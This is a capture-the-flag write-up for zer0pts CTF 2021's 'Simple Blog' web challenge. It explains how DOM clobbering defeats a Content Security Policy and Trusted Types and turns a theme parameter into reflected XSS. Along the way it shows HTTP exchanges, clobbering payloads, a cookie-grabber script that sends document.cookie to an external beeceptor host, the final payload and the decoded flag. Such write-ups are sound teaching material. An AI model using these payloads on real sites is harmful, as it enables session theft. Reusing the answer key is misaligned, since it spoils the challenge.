@@ -1,0 +1,591 @@
+<h1>zer0pts CTF 2021 – Simple Blog</h1>
+
+<ul>
+<li><strong>Category:</strong> web</li>
+<li><strong>Points:</strong> 192</li>
+</ul>
+
+<h2>Challenge</h2>
+
+<blockquote>
+  <p>Now I am developing a blog service. I'm aware that there is a simple XSS. However, I introduced strong security mechanisms, named Content Security Policy and Trusted Types. So you cannot abuse the vulnerability in any modern browsers, including Firefox, right?</p>
+  
+  <p>http://web.ctf.zer0pts.com:8003/</p>
+  
+  <p>author:st98</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>The challenge gives you an <a href="simple_blog_1bfee2f68d1fbeec74729e11cae31aab.tar.gz">attachment</a> containing the source code. The most important files are <a href="simple_blog/web/www/index.php"><code>index.php</code></a> and <a href="simple_blog/web/www/api.php"><code>api.php</code></a>.</p>
+
+<p>Analyzing the website, you can discover the following message under the "Report Vulnerability" section.</p>
+
+<blockquote>
+  <p>If you find a vulnerability in my blog platform, please report a Proof of Concept that exfiltrates document.cookie to me. I will check the URL with Mozilla Firefox later.</p>
+  
+  <p>I only accept reports under /index.php, so please submit only GET paremeters. For example, if the URL you want to submit is http://example.com/index.php?theme=light, please submit only theme=light part.</p>
+</blockquote>
+
+<p>So, given this message and the challenge description, it's pretty obvious that the target of the challenge is to exploit some sort of <em>Reflected XSS</em>.</p>
+
+<p>The website allows the possibility to change the theme via a URL parameter.</p>
+
+<p>Passing a value for the <code>theme</code> parameter will reflect the passed value in some parts of the webpage.</p>
+
+<p>```
+GET /?theme=foo HTTP/1.1
+Host: web.ctf.zer0pts.com:8003
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close</p>
+
+<p>HTTP/1.1 200 OK
+Date: Sat, 06 Mar 2021 01:17:41 GMT
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.4.13
+Vary: Accept-Encoding
+Content-Length: 2957
+Connection: close
+Content-Type: text/html; charset=UTF-8</p>
+
+<p><!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Simple Blog</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-DZ5mzla/D4n5wZNlTB5qQwurzU4=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default">
+    <link rel="stylesheet" href="/css/bootstrap-foo.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+  </head>
+  <body>
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-foo bg-foo">
+        <a class="navbar-brand" href="/">Simple Blog</a>
+        <ul class="navbar-nav mr-auto">
+          <li class="nav-item"><a class="nav-link" href="/report.php">Report Vulnerability</a></li>
+        </ul>
+        <ul class="navbar-nav">
+          <li class="nav-item"><a class="nav-link" href="/?theme=dark">Toggle theme</a></li>
+        </ul>
+      </nav>
+    </div>
+    <main class="container" id="main">
+      <div class="spinner-border" id="loading">
+        <span class="sr-only">Loading...</span>
+      </div>
+    </main>
+    <script src="/js/trustedtypes.build.js" nonce="DZ5mzla/D4n5wZNlTB5qQwurzU4=" data-csp="require-trusted-types-for 'script'; trusted-types default"></script>
+    <script nonce="DZ5mzla/D4n5wZNlTB5qQwurzU4=">
+    // JSONP
+    const jsonp = (url, callback) =&gt; {
+      const s = document.createElement('script');</p>
+
+<pre><code>  if (callback) {
+    s.src = `${url}?callback=${callback}`;
+  } else {
+    s.src = url;
+  }
+
+  document.body.appendChild(s);
+};
+
+// render articles
+const render = articles =&gt; {
+  const main = document.getElementById('main');
+  const loading = document.getElementById('loading');
+
+  articles.sort((a, b) =&gt; a.id - b.id);
+  for (const article of articles) {
+    const elm = document.createElement('article');
+    elm.classList.add('blog-post');
+
+    const title = document.createElement('h2');
+    title.innerHTML = article.title;
+    elm.appendChild(title);
+
+    const content = document.createElement('p');
+    content.innerHTML = article.content;
+    elm.appendChild(content);
+
+    main.appendChild(elm);
+  }
+
+  loading.remove();
+};
+
+// initialize blog
+const init = () =&gt; {
+  // try to register trusted types
+  try {
+    trustedTypes.createPolicy('default', {
+      createHTML(url) {
+        return url.replace(/[&lt;&gt;]/g, '');
+      },
+      createScriptURL(url) {
+        if (url.includes('callback')) {
+          throw new Error('custom callback is unimplemented');
+        }
+
+        return url;
+      }
+    });
+  } catch {
+    if (!trustedTypes.defaultPolicy) {
+      throw new Error('failed to register default policy');
+    }
+  }
+
+  // TODO: implement custom callback
+  jsonp('/api.php', window.callback);
+};
+
+init();
+&lt;/script&gt;
+</code></pre>
+
+<p></body>
+</html>
+```</p>
+
+<p>You can pass a <code>callback</code> parameter to the <a href="simple_blog/web/www/api.php"><code>api.php</code></a> endpoint and the method will be reflected into the output. The length limit is 20 chars.</p>
+
+<p>```
+GET /api.php?callback=foo HTTP/1.1
+Host: web.ctf.zer0pts.com:8003
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: <em>/</em>
+Referer: http://web.ctf.zer0pts.com:8003/
+Accept-Encoding: gzip, deflate
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close</p>
+
+<p>HTTP/1.1 200 OK
+Date: Sat, 06 Mar 2021 01:08:52 GMT
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.4.13
+Vary: Accept-Encoding
+Content-Length: 569
+Connection: close
+Content-Type: application/javascript</p>
+
+<p>foo([{"id":1,"title":"Hello, world!","content":"Welcome to my blog platform!"},{"id":2,"title":"Lorem ipsum","content":"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."}])
+```</p>
+
+<p>Theoretically, the following payload would give an XSS, but it is blocked by the CSP.</p>
+
+<p>```
+GET /?theme=dark.min.css"><script>alert()</script>&lt; HTTP/1.1
+Host: web.ctf.zer0pts.com:8003
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close</p>
+
+<p>HTTP/1.1 200 OK
+Date: Sat, 06 Mar 2021 01:19:19 GMT
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.4.13
+Vary: Accept-Encoding
+Content-Length: 3065
+Connection: close
+Content-Type: text/html; charset=UTF-8</p>
+
+<p><!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Simple Blog</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-gGLouNdYKt4a0tKHwIOwMDc9Giw=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default">
+    <link rel="stylesheet" href="/css/bootstrap-dark.min.css"><script>alert()</script>&lt;.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+  </head>
+  <body>
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-dark.min.css"><script>alert()</script>&lt; bg-dark.min.css"><script>alert()</script>&lt;">
+        <a class="navbar-brand" href="/">Simple Blog</a>
+        <ul class="navbar-nav mr-auto">
+          <li class="nav-item"><a class="nav-link" href="/report.php">Report Vulnerability</a></li>
+        </ul>
+        <ul class="navbar-nav">
+          <li class="nav-item"><a class="nav-link" href="/?theme=dark">Toggle theme</a></li>
+        </ul>
+      </nav>
+    </div>
+    <main class="container" id="main">
+      <div class="spinner-border" id="loading">
+        <span class="sr-only">Loading...</span>
+      </div>
+    </main>
+    <script src="/js/trustedtypes.build.js" nonce="gGLouNdYKt4a0tKHwIOwMDc9Giw=" data-csp="require-trusted-types-for 'script'; trusted-types default"></script>
+    <script nonce="gGLouNdYKt4a0tKHwIOwMDc9Giw=">
+    // JSONP
+    const jsonp = (url, callback) =&gt; {
+      const s = document.createElement('script');</p>
+
+<pre><code>  if (callback) {
+    s.src = `${url}?callback=${callback}`;
+  } else {
+    s.src = url;
+  }
+
+  document.body.appendChild(s);
+};
+
+// render articles
+const render = articles =&gt; {
+  const main = document.getElementById('main');
+  const loading = document.getElementById('loading');
+
+  articles.sort((a, b) =&gt; a.id - b.id);
+  for (const article of articles) {
+    const elm = document.createElement('article');
+    elm.classList.add('blog-post');
+
+    const title = document.createElement('h2');
+    title.innerHTML = article.title;
+    elm.appendChild(title);
+
+    const content = document.createElement('p');
+    content.innerHTML = article.content;
+    elm.appendChild(content);
+
+    main.appendChild(elm);
+  }
+
+  loading.remove();
+};
+
+// initialize blog
+const init = () =&gt; {
+  // try to register trusted types
+  try {
+    trustedTypes.createPolicy('default', {
+      createHTML(url) {
+        return url.replace(/[&lt;&gt;]/g, '');
+      },
+      createScriptURL(url) {
+        if (url.includes('callback')) {
+          throw new Error('custom callback is unimplemented');
+        }
+
+        return url;
+      }
+    });
+  } catch {
+    if (!trustedTypes.defaultPolicy) {
+      throw new Error('failed to register default policy');
+    }
+  }
+
+  // TODO: implement custom callback
+  jsonp('/api.php', window.callback);
+};
+
+init();
+&lt;/script&gt;
+</code></pre>
+
+<p></body>
+</html>
+```</p>
+
+<p>The CSP is the following (defined in the <code>meta</code> tag of <a href="simple_blog/web/www/index.php"><code>index.php</code></a>) and it can't be bypassed easily.</p>
+
+<p><code>
+default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-gGLouNdYKt4a0tKHwIOwMDc9Giw=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default
+</code></p>
+
+<p>First of all: you have to use Firefox for your testing phase, because the admin will use that browser.</p>
+
+<p>The most important part of <a href="simple_blog/web/www/index.php"><code>index.php</code></a> is the following JavaScript.</p>
+
+<p>```javascript
+    // JSONP
+    const jsonp = (url, callback) =&gt; {
+      const s = document.createElement('script');</p>
+
+<pre><code>  if (callback) {
+    s.src = `${url}?callback=${callback}`;
+  } else {
+    s.src = url;
+  }
+
+  document.body.appendChild(s);
+};
+
+// render articles
+const render = articles =&gt; {
+  const main = document.getElementById('main');
+  const loading = document.getElementById('loading');
+
+  articles.sort((a, b) =&gt; a.id - b.id);
+  for (const article of articles) {
+    const elm = document.createElement('article');
+    elm.classList.add('blog-post');
+
+    const title = document.createElement('h2');
+    title.innerHTML = article.title;
+    elm.appendChild(title);
+
+    const content = document.createElement('p');
+    content.innerHTML = article.content;
+    elm.appendChild(content);
+
+    main.appendChild(elm);
+  }
+
+  loading.remove();
+};
+
+// initialize blog
+const init = () =&gt; {
+  // try to register trusted types
+  try {
+    trustedTypes.createPolicy('default', {
+      createHTML(url) {
+        return url.replace(/[&lt;&gt;]/g, '');
+      },
+      createScriptURL(url) {
+        if (url.includes('callback')) {
+          throw new Error('custom callback is unimplemented');
+        }
+
+        return url;
+      }
+    });
+  } catch {
+    if (!trustedTypes.defaultPolicy) {
+      throw new Error('failed to register default policy');
+    }
+  }
+
+  // TODO: implement custom callback
+  jsonp('/api.php', window.callback);
+};
+
+init();
+</code></pre>
+
+<p>```</p>
+
+<p>The process works as follow:
+1. a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/trusted-types"><code>trusted-types</code></a> policy is created;
+2. the <code>jsonp</code> method is invoked;
+3. the <code>jsonp</code> method calls <a href="simple_blog/web/www/api.php"><code>api.php</code></a> passing the content of <code>window.callback</code>, if specified;
+4. <a href="simple_blog/web/www/api.php"><code>api.php</code></a> returns a JavaScript snippet that will be included in the webpage and it will be executed, because it is considered "safe" for all defined policies;
+5. the default method that will be executed is the <code>render</code> one, that will print blog posts into the page.</p>
+
+<p>As a consequence, if it is possible to define <code>window.callback</code> you can execute an arbitrary JavaScript payload.</p>
+
+<p>This can be achieved with a technique called <a href="https://portswigger.net/web-security/dom-based/dom-clobbering"><em>DOM clobbering</em></a>. With this technique, the <code>window.callback</code> can be the reference to an HTML object with <code>id="callback"</code>, so a payload like the following can be used.</p>
+
+<p>```
+GET /?theme=dark.min.css%22%3E%3Cdiv+id=%22callback%22%3Efoo%3C/div%3E%3C HTTP/1.1
+Host: web.ctf.zer0pts.com:8003
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close</p>
+
+<p>HTTP/1.1 200 OK
+Date: Sat, 06 Mar 2021 01:33:35 GMT
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.4.13
+Vary: Accept-Encoding
+Content-Length: 3077
+Connection: close
+Content-Type: text/html; charset=UTF-8</p>
+
+<p><!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Simple Blog</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-uA0mbXM3XN0qqrr9Ln1E26ka/tE=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default">
+    <link rel="stylesheet" href="/css/bootstrap-dark.min.css"><div id="callback">foo</div>&lt;.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+  </head>
+  <body>
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-dark.min.css"><div id="callback">foo</div>&lt; bg-dark.min.css"><div id="callback">foo</div>&lt;">
+        <a class="navbar-brand" href="/">Simple Blog</a>
+        <ul class="navbar-nav mr-auto">
+          <li class="nav-item"><a class="nav-link" href="/report.php">Report Vulnerability</a></li>
+        </ul>
+        <ul class="navbar-nav">
+          <li class="nav-item"><a class="nav-link" href="/?theme=dark">Toggle theme</a></li>
+        </ul>
+      </nav>
+    </div>
+    <main class="container" id="main">
+      <div class="spinner-border" id="loading">
+        <span class="sr-only">Loading...</span>
+      </div>
+    </main>
+    <script src="/js/trustedtypes.build.js" nonce="uA0mbXM3XN0qqrr9Ln1E26ka/tE=" data-csp="require-trusted-types-for 'script'; trusted-types default"></script>
+    <script nonce="uA0mbXM3XN0qqrr9Ln1E26ka/tE=">
+    // JSONP
+    const jsonp = (url, callback) =&gt; {
+      const s = document.createElement('script');</p>
+
+<pre><code>  if (callback) {
+    s.src = `${url}?callback=${callback}`;
+  } else {
+    s.src = url;
+  }
+
+  document.body.appendChild(s);
+};
+
+// render articles
+const render = articles =&gt; {
+  const main = document.getElementById('main');
+  const loading = document.getElementById('loading');
+
+  articles.sort((a, b) =&gt; a.id - b.id);
+  for (const article of articles) {
+    const elm = document.createElement('article');
+    elm.classList.add('blog-post');
+
+    const title = document.createElement('h2');
+    title.innerHTML = article.title;
+    elm.appendChild(title);
+
+    const content = document.createElement('p');
+    content.innerHTML = article.content;
+    elm.appendChild(content);
+
+    main.appendChild(elm);
+  }
+
+  loading.remove();
+};
+
+// initialize blog
+const init = () =&gt; {
+  // try to register trusted types
+  try {
+    trustedTypes.createPolicy('default', {
+      createHTML(url) {
+        return url.replace(/[&lt;&gt;]/g, '');
+      },
+      createScriptURL(url) {
+        if (url.includes('callback')) {
+          throw new Error('custom callback is unimplemented');
+        }
+
+        return url;
+      }
+    });
+  } catch {
+    if (!trustedTypes.defaultPolicy) {
+      throw new Error('failed to register default policy');
+    }
+  }
+
+  // TODO: implement custom callback
+  jsonp('/api.php', window.callback);
+};
+
+init();
+&lt;/script&gt;
+</code></pre>
+
+<p></body>
+</html>
+```</p>
+
+<p>But this will trigger the error: <code>custom callback is unimplemented</code>. That happens because, in the CSP, there is the definition of <code>default</code> trusted type which is defined in the <code>init()</code> JavaScript function in the page.</p>
+
+<p><img src="custom_callback_error.png" alt="custom<em>callback</em>error.png" /></p>
+
+<p>The <em>DOM clobbering</em> technique can help you again. Here some references that can be useful to understand how it works:
+* <a href="https://portswigger.net/web-security/dom-based/dom-clobbering">https://portswigger.net/web-security/dom-based/dom-clobbering</a>
+* <a href="https://portswigger.net/research/dom-clobbering-strikes-back">https://portswigger.net/research/dom-clobbering-strikes-back</a>
+* <a href="https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94">https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94</a>
+* <a href="https://medium.com/@terjanq/clobbering-the-clobbered-vol-2-fb199ad7ec41">https://medium.com/@terjanq/clobbering-the-clobbered-vol-2-fb199ad7ec41</a></p>
+
+<p>The first step is to inject via <em>DOM clobbering</em> a <code>trustedType</code> object in order to override the one provided by the library. An exception will be thrown and the <code>catch</code> in the <code>init()</code> method will be reached. To bypass the <code>if</code> clause inside the <code>catch</code>, it is sufficient to use again the <em>DOM clobbering</em>, using a payload like the following.</p>
+
+<p><code>html
+dark.min.css"&gt;&lt;form id=trustedTypes&gt;&lt;output id=defaultPolicy&gt;true&lt;/output&gt;&lt;/form&gt;&lt;"
+</code></p>
+
+<p>Now you can call the the api.php endpoint specifying a callback. A payload like the following can give a basic XSS.</p>
+
+<p><code>html
+dark.min.css"&gt;&lt;form id=trustedTypes&gt;&lt;output id=defaultPolicy&gt;true&lt;/output&gt;&lt;/form&gt;&lt;a id=callback href=//%250Aalert();&gt;&lt;/a&gt;&lt;"
+</code></p>
+
+<p>Beacause the result request will be the following.</p>
+
+<p>```
+GET /api.php?callback=//%0Aalert(); HTTP/1.1
+Host: web.ctf.zer0pts.com:8003
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
+Accept: <em>/</em>
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://web.ctf.zer0pts.com:8003/?theme=dark.min.css%22%3E%3Cform%20id=trustedTypes%3E%3Coutput%20id=defaultPolicy%3Etrue%3C/output%3E%3C/form%3E%3Ca%20id=callback%20href=//%250Aalert();%3E%3C/a%3E%3C%22</p>
+
+<p>HTTP/1.1 200 OK
+Date: Sat, 06 Mar 2021 14:03:22 GMT
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.4.13
+Vary: Accept-Encoding
+Content-Length: 577
+Connection: close
+Content-Type: application/javascript</p>
+
+<p>//
+alert();([{"id":1,"title":"Hello, world!","content":"Welcome to my blog platform!"},{"id":2,"title":"Lorem ipsum","content":"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."}])
+```</p>
+
+<p>You can use <code>jsonp</code> method itself to perform cross-origin request, getting the URL via <em>DOM clobbering</em> to bypass the maximum length.</p>
+
+<p><code>html
+dark.min.css"&gt;&lt;form id=trustedTypes&gt;&lt;output id=defaultPolicy&gt;true&lt;/output&gt;&lt;/form&gt;&lt;a id=x href=https://&lt;REDACTED&gt;.free.beeceptor.com/&gt;&lt;/a&gt;&lt;a id=callback href=//%250Ajsonp(x);&gt;&lt;/a&gt;&lt;"
+</code></p>
+
+<p>Analyzing the final webpage after the request, you can discover that with <code>jsonp</code> method the response of the cross-origin call is included in the page source and treated like an allowed JavaScript.</p>
+
+<p><img src="remote_script.png" alt="remote_script.png" /></p>
+
+<p>So you can create two endpoints:
+* <code>/evil/</code> that will be called by the <code>jsonp</code> method and will return a cookie grabber script;
+* <code>/cookie/</code> that will be called by the cookie grabber script to exfiltrate cookies.</p>
+
+<p>The cookie grabber script is the following. You have to set <code>Content-Type: application/javascript</code>.</p>
+
+<p><code>javascript
+document.location='https://&lt;REDACTED&gt;.free.beeceptor.com/cookie/'+btoa(document.cookie)
+</code></p>
+
+<p>So the final payload to submit is the following.</p>
+
+<p><code>html
+theme=dark.min.css"&gt;&lt;form id=trustedTypes&gt;&lt;output id=defaultPolicy&gt;true&lt;/output&gt;&lt;/form&gt;&lt;a id=x href=https://&lt;REDACTED&gt;.free.beeceptor.com/evil/&gt;&lt;/a&gt;&lt;a id=callback href=//%250Ajsonp(x);&gt;&lt;/a&gt;&lt;"
+</code></p>
+
+<p>Under the <code>/cookie/</code> endpoint you will find the base64 encoded cookies with the flag.</p>
+
+<p><img src="endpoints.png" alt="endpoints.png" /></p>
+
+<p><code>
+ZmxhZz16ZXIwcHRzezFfdzRudF90MF9lNHRfZDBtX2QwbV9oNG1idXJnZXJfczBtZWQ0eX0=
+</code></p>
+
+<p>Decoding it.</p>
+
+<p><code>
+flag=zer0pts{1_w4nt_t0_e4t_d0m_d0m_h4mburger_s0med4y}
+</code></p>
